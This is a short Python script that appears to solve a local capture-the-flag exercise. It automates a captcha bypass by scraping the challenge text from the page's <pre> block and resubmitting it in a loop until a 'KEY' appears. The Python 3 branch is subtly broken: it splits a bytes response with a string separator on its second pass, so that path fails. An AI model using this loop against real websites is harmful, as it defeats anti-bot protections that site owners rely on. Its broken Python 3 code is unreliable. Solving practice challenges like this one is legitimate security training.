try: # python 2
    import urllib2 as req
    from sys import exit

    walled_garden = req.urlopen("http://localhost/builds-hackme/www/walled_garden.php?name=amo95").read()

    while True:
        first_split = walled_garden.split("<pre>")
        second_split = first_split[1].split("</pre>")
        walled_garden = req.urlopen("http://localhost/builds-hackme/www/walled_garden.php?name=amo95&captcha=" + second_split[0]).read()
    
        if "KEY" in walled_garden:
            print(walled_garden)
            exit(0)

except ImportError: # python 3
    import urllib.request as req
    from sys import exit

    walled_garden = req.urlopen("http://localhost/builds-hackme/www/walled_garden.php?name=amo95").read()
    walled_garden_con = str(walled_garden)

    while True:
        first_split = walled_garden_con.split("<pre>")
        second_split = first_split[1].split("</pre>")
        walled_garden_con = req.urlopen("http://localhost/builds-hackme/www/walled_garden.php?name=amo95&captcha=" + second_split[0]).read()

        if b'KEY' in walled_garden_con:
            print(walled_garden_con)
            exit(0)
